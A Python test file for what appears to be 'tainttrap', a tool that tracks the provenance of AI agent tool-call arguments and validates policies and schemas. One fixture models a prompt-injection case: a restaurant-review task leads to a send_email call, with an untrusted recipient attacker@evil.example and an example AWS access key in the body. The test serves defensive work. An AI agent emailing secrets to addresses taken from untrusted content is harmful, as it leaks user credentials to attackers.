import jsonschema
import pytest
import yaml

from tainttrap.core.dossier import build_dossier
from tainttrap.core.policy import default_policy_text, load_policy
from tainttrap.core.schemas import SCHEMAS, load_schema
from tainttrap.core.types import ArgumentProvenance, Origin, RiskClass


@pytest.mark.parametrize("name", SCHEMAS)
def test_schema_is_valid(name):
    jsonschema.Draft202012Validator.check_schema(load_schema(name))


def test_default_policy_matches_schema():
    jsonschema.validate(yaml.safe_load(default_policy_text()), load_schema("policy"))
    jsonschema.validate(
        load_policy().model_dump(mode="json", exclude_none=True), load_schema("policy")
    )


def test_dossier_matches_schema():
    d = build_dossier(
        task="Find reviews of restaurant X and send me a summary",
        tool="send_email",
        registry_entry=None,
        risk_class=RiskClass.EXTERNAL_COMMUNICATION,
        arguments={"to": "attacker@evil.example", "body": "AKIAIOSFODNN7EXAMPLE"},
        provenance=[ArgumentProvenance(path="args.to", origin=Origin.UNTRUSTED)],
        recent_actions=["web_search", "fetch_page"],
    )
    jsonschema.validate(d.to_public(), load_schema("dossier"))
